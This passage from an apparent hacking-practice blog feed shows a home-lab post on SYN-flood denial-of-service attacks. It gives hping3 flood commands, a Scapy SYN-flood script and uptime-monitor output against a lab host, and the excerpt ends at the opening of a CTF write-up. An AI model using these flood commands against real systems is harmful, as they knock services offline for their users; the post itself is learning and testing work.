&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response_text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BASE_URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ConnectionError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_ADDR&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; is NOT working: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start_time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; - Reason: ConnectionError&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_ADDR&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; is NOT working: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start_time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; - Reason: Timeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response_text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TYPICAL_RESPONSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_ADDR&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; is not delivering correct content: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start_time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_ADDR&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; is working: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start_time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;One of the most simple methods for doing a DDoS attack is called a SYN Flood. In a typical TCP connection, communication is initiated when:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Host A sends a TCP segment with the SYN flag activated to Host B.&lt;/li&gt;
  &lt;li&gt;Host B responds with a TCP segment with both the SYN/ACK flags activated to Host A&lt;/li&gt;
  &lt;li&gt;Host A responds with a TCP segment with the ACK flag activated to Host B.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This is called the 3-way handshake. In order to maintain the state of a connection, both hosts need to allocate some memory. During the handshake, while Host B is waiting for the segment with the ACK flag from Host A in step 3, Host B has allocated a set amount of memory that it will hold for a time until it decides to let it go. This can be exploited by an attacker to make a host allocate too much memory, eventually causing a crash. This is done by sending tens of thousands of SYN segments. Say it takes 84 bytes to keep the state of a TCP connection, each connection state is held for 10 seconds and an attacker can send 10,000 SYN segments, then it will force the victim to allocate 8.4 MB of RAM after 10 seconds. If an attacker can send 10 million segments a second, it will force the machine to allocate 8.4 GB, enough to cause significant lag, if not crash a system entirely.&lt;/p&gt;

&lt;h1 id=&quot;hping3&quot;&gt;hping3&lt;/h1&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hping3&lt;/code&gt; is a command-line tool that allows a user to send arbitrary packets to a host. It has a lot of really useful tools for legitimate network engineer purposes, like the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-z&lt;/code&gt; flag that allows you to increment/decrement the TTL of the packets. We’re gonna use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--fast&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--faster&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--flood&lt;/code&gt; flags.&lt;/p&gt;

&lt;p&gt;Using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--fast&lt;/code&gt; flag is not enough to cause a DDoS, after running for 5 minutes, there’s only one error:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;23:31&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ddos ➭ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;hping3 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--fast&lt;/span&gt; 192.168.5.140 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8080
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;23:26&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ddos ➭ python3 alert.py
192.168.5.140 is NOT working: 0:00:17.168187 - Reason: ConnectionError
192.168.5.140 is working: 0:04:41.516566
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here’s the results with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--faster&lt;/code&gt; flag:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;23:31&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ddos ➭ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;hping3 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--faster&lt;/span&gt; 192.168.5.140 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8080
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;23:32&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ddos ➭ python3 alert.py
192.168.5.140 is NOT working: 0:00:25.130376 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:32.890300 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:38.131361 - Reason: Timeout
192.168.5.140 is NOT working: 0:00:42.402327 - Reason: Timeout
192.168.5.140 is NOT working: 0:00:49.479263 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:56.347507 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:01:00.612899 - Reason: Timeout
192.168.5.140 is NOT working: 0:01:02.748265 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:01:07.172784 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:01:09.200692 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:01:15.700279 - Reason: ConnectionError
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here’s the results with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--flood&lt;/code&gt; flag, which nearly crashed my computer and made the Wendigoon video I was watching on the other monitor become nearly incomprehensible.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;23:34&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ddos ➭ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;hping3 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--flood&lt;/span&gt; 192.168.5.140 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8080
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;23:35&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ddos ➭ python3 alert.py
192.168.5.140 is NOT working: 0:00:03.136107 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:05.146903 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:07.159407 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:09.229592 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:11.359851 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:13.387867 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:15.396786 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:17.727767 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:19.734578 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:21.898394 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:23.938181 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:26.016161 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:28.019673 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:30.051269 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:32.268846 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:36.057949 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:38.252743 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:40.258710 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:42.261723 - Reason: ConnectionError    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can notice that as expected, the higher rates of malicious packets crash the target earlier.&lt;/p&gt;

&lt;p&gt;Wireshark with the filter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp.flags.syn == 1 and tcp.dstport == 8080&lt;/code&gt; shows 234,017 segments in 60 seconds.&lt;/p&gt;

&lt;h1 id=&quot;scapy&quot;&gt;Scapy&lt;/h1&gt;
&lt;p&gt;Scapy is a very powerful tool that allows a programmer to send arbitrary packets, giving the user control of basically every field. We can use this simple script:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;192.168.5.140&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;target_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8080&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RandShort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verbose&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To send packets to port 8080 basically as fast as a single thread can create them. I would like to learn more about multithreading/multiprocessing in the future, and coding up an attack like this would be an excellent application of that technique, so I’ll put off improving this attack for a future post.&lt;/p&gt;

&lt;p&gt;Wireshark shows that this script is able to generate about 750 SYN segments over 60 seconds.&lt;/p&gt;

&lt;h1 id=&quot;metasploit-packages&quot;&gt;Metasploit packages&lt;/h1&gt;
&lt;p&gt;Searching through the current Metasploit packages with the keyword &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dos&lt;/code&gt; reveals a subset of packages under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auxiliary/dos&lt;/code&gt; path, which contains 119 premade packages. The vast majority of them are platform or software specific, including some alarming ones like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auxiliary/dos/apple_ios/webkit_backdrop_filter_blur&lt;/code&gt; with the description &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iOS Safari Denial of Service with CSS&lt;/code&gt; from 2018, and one called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auxiliary/dos/http/metasploit_httphandler_dos&lt;/code&gt; that as far as I can tell, DoS’s Metasploit itself.&lt;/p&gt;

&lt;p&gt;Metasploit comes with a package called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dos/tcp/synflood&lt;/code&gt; that executes a SYN flood attack. I would typically include the output of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alert.py&lt;/code&gt; script, but as far as I can tell, running it the first time completely bricked the test machine in my home lab. However, using Wireshark reveals that over 60 seconds, it generates something like 82k packets.&lt;/p&gt;

&lt;h1 id=&quot;finishing-up&quot;&gt;Finishing up&lt;/h1&gt;
&lt;p&gt;I’m surprised that the Metasploit package wasn’t the most effective in terms of packets per second. Perhaps looking into updating the package would be an interesting future blog post. SYN floods are just about the easiest DoS attack to execute, so in practice, any modern firewall would catch them. I would like the chance to test this again once I acquire a nicer firewall for the home lab.&lt;/p&gt;

&lt;h1 id=&quot;music-from-this-week&quot;&gt;Music from this week&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/album/6jWde94ln40epKIQCd8XUh?si=3jG7RSh1SIWCTHIRroR1aA&quot;&gt;Toxicity&lt;/a&gt; by System of a Down&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/album/0BwWUstDMUbgq2NYONRqlu?si=AJvaEJmwRf2xTDKpEUI-AA&quot;&gt;Rumours&lt;/a&gt; by Fleetwood Mac&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="python" /><summary type="html">This week, I’m going to take a look at some variants of DDoS attacks, particularly kinds that can be executed using out-of-the-box tools and basic scripting.</summary></entry><entry><title type="html">Week 9 - Angstrom CTF</title><link href="http://localhost:4000/year-of-hacking-0x9" rel="alternate" type="text/html" title="Week 9 - Angstrom CTF" /><published>2024-05-27T00:00:00-06:00</published><updated>2024-05-27T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0x9</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0x9">&lt;p&gt;This week, me and the rest of BYU Cyberia participated in AngstromCTF, a CTF put on by Montgomery Blair High School in Maryland. I was very impressed by the caliber of challenges. Most of us in BYU Cyberia (myself included) took a break from CTFs this week because of Memorial Day, so I only solved 3 challenges, one Server-side Template Injection (SSTI) using unsanitized user input, an SQL injection, and a simple RCE exploit.&lt;/p&gt;

&lt;h2 id=&quot;presidential&quot;&gt;Presidential&lt;/h2&gt;
&lt;p&gt;We get a Python file that is actually 5 of the &lt;a href=&quot;https://en.uncyclopedia.co/wiki/C++#History&quot;&gt;C++ mascot rats&lt;/a&gt; in a trench coat and mustache glasses pretending to be a snake:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/local/bin/python
&lt;/span&gt;  
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;ctypes&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;mmap&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;redacted&quot;&lt;/span&gt;
  
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;White House declared Python to be memory safe :tm:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAGESIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROT_READ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROT_WRITE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROT_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
